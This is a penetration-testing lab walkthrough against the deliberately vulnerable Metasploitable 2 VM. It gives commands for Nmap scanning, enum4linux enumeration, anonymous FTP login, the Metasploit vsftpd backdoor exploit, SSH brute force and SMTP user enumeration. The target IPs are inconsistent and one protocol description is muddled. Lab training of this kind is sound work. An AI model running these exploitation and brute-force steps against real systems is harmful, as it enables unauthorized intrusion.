@@ -1,0 +1,129 @@
+Setting up Metasploitable-2
+1.Now power on this virtual machine.
+2.Now this machine starts…
+	Default passwords for Metasploitable2 are:
+	Username: msfadmin
+	Password: msfadmin
+	Then the machine starts after entering the credentials …
+    [image1.png]
+3.Find machine IP address by using the following command in terminal:
+	ifconfig
+    [image2.png]
+--------------------------------------
+--------------------------------------
+[
+	for using tools description
+]
+--------------------------------------
+--------------------------------------
+Scanning
+	
+Through the above command in the terminal, we know the IP address of this machine is 192.168.244.131. Now we are going to scan this IP address with the Nmap tool. Use the following command to perform the scan:
+	nmap -n -sV -p- 10.248.57.118
+     [image3.png]
+---------------------------------------
+---------------------------------------
+Enumeration Techniques Applied
+
+1.enum4linux:
+	Enum4linux is primarily used to gather information in the early stages of a penetration test to find potential entry points, such as open shares or weak user enumeration restrictions.
+
+    Operating System Information (-o): enum4linux -o 10.248.57.118
+    [image4.png]
+
+    User Listing (-U): enum4linux -U 10.248.57.118
+    [image5.png][image6.png][image7.png]
+	
+-------------------------------
+-------------------------------
+Exploitation
+
+ports shown in the Nmap scanning are to be exploited in the following way:
+--------------------------
+Port-21 (FTP)
+
+Method 1:
+As this is an Anonymous FTP server, we can login with anonymous as the username and for the password, don’t give any password, just press enter. It will login successfully and give the FTP shell.
+    Command: ftp 10.248.57.118 
+	[image8.png]
+
+
+
+Method 2: (Exploiting FTP through Metasploit Framework)
+
+As we know the FTP version is vsftpd, we can exploit it using Metasploit Framework. Follow the steps below to exploit through Metasploit Framework:
+
+1.Open your terminal and type msfconsole.
+2.Search for the exploit: search vsftpd
+	[image9.png]
+
+use exploit/unix/ftp/vsftpd_234_backdoor or use 1
+show options
+set RHOST 192.168.164.129
+	[image10.png] 
+exploit
+  	[image10.png]
+  (and if not open directly shell then interact with session)
+	[image11.png]
+
+------------------------------
+Port-22 (SSH)
+
+The Secure Shell Protocol (SSH) is a cryptographic network protocol for operating network services securely over an unsecured network. Secure Shell is a network communication protocol that enables two computers to communicate (http or hypertext transfer protocol, which is the protocol used to transfer hypertext such as web pages) and share data.
+
+Connecting to SSH Server
+The command for connecting to the SSH server is:
+	ssh <username>@<target_ip_address>
+
+Method 1:(Exploiting SSH through Metasploit Framework)
+Here also we are doing the Brute Force with Metasploit Framework . Follow below steps to exploit in this machine.
+
+msfconsole
+search ssh_login
+use auxialiary/scanner/ssh/ssh_login or use 0
+
+Now we need to set the RHOST and need to set the usernames and passwords dictionaries to brute force the ssh.
+
+set RHOST 192.168.164.129
+set USERPASS_FILE /home/ram/wrk/upass.txt
+set USER_FILE /home/ram/wrk/unames.txt
+set USER_AS_PASS true
+set STOP_ON_SUCCESS true
+run or exploit
+	[image12.png]
+
+Now lets check the obtained username and password with
+
+ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.164.129
+(because Metasploitable 2 is an old system using outdated security protocols (ssh-rsa and ssh-dss)
+Run the command above.
+It will ask: Are you sure you want to continue connecting (yes/no/[fingerprint])?
+Type yes and press Enter.
+When it asks for the password, type msfadmin (note: you won't see characters appearing as you type).
+	[image13.png]
+------------------------------------------
+Port-25 ( SMTP ) :
+
+Simple Mail Transfer Protocol is an application that is used to send, receive, and relay outgoing emails between senders and receivers. When an email is sent, it’s transferred over the internet from one server to another using SMTP. In simple terms, an SMTP email is just an email sent using the SMTP server. SMTP is part of the application layer of the TCP/IP protocol .
+
+method 1:- (through netcat) through this we can check the each username that it exits or not .
+
+nc 192.168.164.129 25
+
+now we need to use the VRFY command to check the user exits or not
+
+VRFY (user name)
+(If it returns a 250 or 252 code, enumeration is working. If it returns a 550 or 502, it's blocked.)
+	[image14.png]
+
+method 2:- (using Metasploit Framework) search for smtp_enum and use select that module to use then set RHOST after that exploit that’s it.
+
+search smtp_enum
+use auxiliary/scanner/smtp/smtp_enum
+set RHOST 192.168.164.129
+set USER_FILE /home/ram/wrk/unames.txt
+set VERBOSE true
+run
+
+this will extract the possible user lists and through that we can try brute force.
+	[image15.png]
